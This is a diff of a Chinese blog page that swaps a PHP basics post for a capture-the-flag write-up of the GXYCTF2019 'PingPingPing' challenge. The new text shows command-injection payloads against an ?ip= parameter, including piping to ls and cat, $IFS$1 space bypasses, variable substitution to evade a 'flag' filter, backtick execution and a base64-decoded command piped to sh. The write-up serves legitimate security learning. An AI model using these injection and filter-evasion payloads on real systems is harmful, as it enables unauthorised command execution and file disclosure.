@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>php学习day2 | 大周&#39;blog</title>
+  <title>GXYCTF2019-PingPingPing | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -231,8 +231,8 @@
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
           <header class="entry-header">
-            <h1 class="entry-title">php学习day2</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2020-3-13&nbsp;
+            <h1 class="entry-title">GXYCTF2019-PingPingPing</h1>
+            <p class="entry-census">&nbsp;·&nbsp;2020-6-17&nbsp;
               
                     
         ·<span id="readcount"></span>次阅读
@@ -242,29 +242,31 @@
           </header>
         
         <div class="entry-content">
-          <h2 id="数据类型判断"><a href="#数据类型判断" class="headerlink" title="数据类型判断"></a>数据类型判断</h2><a id="more"></a>
+          <p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
+<a id="more"></a>
 
-<p>通过一组类型判断函数，来判断变量，最终返回这个变量所保存数据的数据类型(相同为true,否则为false)：是一组以is_开头后面跟类型名字的函数</p>
-<p>is_×××(变量名)</p>
-<p>Bool(布尔)类型不能用echo来查看，可以使用var_dump来查看</p>
-<p>Var_dump(变量1,变量2…)</p>
-<pre><code>Var_dump(is_int($a));</code></pre><p>Gettype(变量名)：获取类型 得到的是该类型对应的字符串</p>
-<p>Settype(变量名,类型)：设定数据类型，与强制转换不同</p>
-<p>1.强制转换(类型)变量名，是对数据复制的内容进行处理（不会处理实际存储的内容）</p>
-<p>2.Settype会直接改变数据本身</p>
-<h2 id="整数类型进制"><a href="#整数类型进制" class="headerlink" title="整数类型进制"></a>整数类型进制</h2><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>在PHP中提供了四种整型的定义方式：十进制定义、二进制定义、八进制定义、十六进制定义</p>
-<pre><code>$a=120;        //10进制
-$a=0b110;      //2进制
-$a=0120;       //8进制
-$a=0×120;      //16进制</code></pre><p>默认的PHP输出数值都会自动转换成10进制</p>
-<h3 id="整数类型进制转换"><a href="#整数类型进制转换" class="headerlink" title="整数类型进制转换"></a>整数类型进制转换</h3><p><img src="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/QQ%E6%88%AA%E5%9B%BE20200313221130.jpg" alt="QQ截图20200313221130"></p>
-<p><img src="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/QQ%E6%88%AA%E5%9B%BE20200313221726.jpg" alt="QQ截图20200313221726"></p>
-<p>Decbin():     十进制转二进制</p>
-<p>Decoct():     十进制转八进制</p>
-<p>Dechex():     十进制转十六进制</p>
-<p>Bindec():      二进制转十进制</p>
-<p>……以此类推</p>
-<pre><code>var_dump(decbin(107));</code></pre>
+<p>打开题目</p>
+<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/1.png" alt="1"></p>
+<p>只有一个/?ip=</p>
+<p>尝试传?ip=127.0.0.1，得到回显</p>
+<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/2.png" alt="2"></p>
+<p>利用管道符漏洞，传?ip=127.0.0.1||ls</p>
+<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/3.png" alt="3"></p>
+<p>看到flag.php 传?ip=127.0.0.1||cat%20flag.php</p>
+<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/4.png" alt="4"></p>
+<p>尝试传一下，得知如果我们传入的字符含有flag空格或者/，那么就会返回错误</p>
+<p>这里用$IFS$1来绕过空格的限制，传?ip=127.0.0.1||cat$IFS$1index.php</p>
+<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/5.png" alt="5"></p>
+<p>可以看到确实过滤了很多</p>
+<p>这里我用三种办法</p>
+<h4 id="1-变量替换"><a href="#1-变量替换" class="headerlink" title="1.变量替换"></a>1.变量替换</h4><p><code>preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip</code></p>
+<p>因为这个会判断输入语句中是否按顺序出现f l a g，所以我们用</p>
+<p>?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php</p>
+<h4 id="2-内敛执行"><a href="#2-内敛执行" class="headerlink" title="2.内敛执行"></a>2.内敛执行</h4><pre><code>?ip=127.0.0.1||a=g;cat$IFS$1`ls`</code></pre><h4 id="3-sh"><a href="#3-sh" class="headerlink" title="3.sh"></a>3.sh</h4><p>既然过滤了bash，那么可以用sh</p>
+<p>?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p>
+<p>其中Y2F0IGZsYWcucGhw是base64加密之后的cat flag.php</p>
+<p>关于命令执行的绕过，可以参考ghtwf01师傅的这篇文章：<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">命令执行漏洞利用及绕过方式总结</a></p>
+
         </div>
         <!-- .entry-content -->
         
@@ -285,39 +287,20 @@ $a=0×120;      //16进制</code></pre><p>默认的PHP输出数值都会自动�
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/" rel="prev">
-              <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/783bf161f47b32882f0e962fd4064de7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                ctfhub-信息泄露-Git泄露</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/" rel="next">
+            <a href="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/e9f33c2c502ab43804964ce7edd431f9.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/a5fa4f9db760f58fc48f03d66b4967f7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                php学习day1</h3>
+                极客大挑战2019-Http</h3>
                 <hr>
               </div>
             </a>
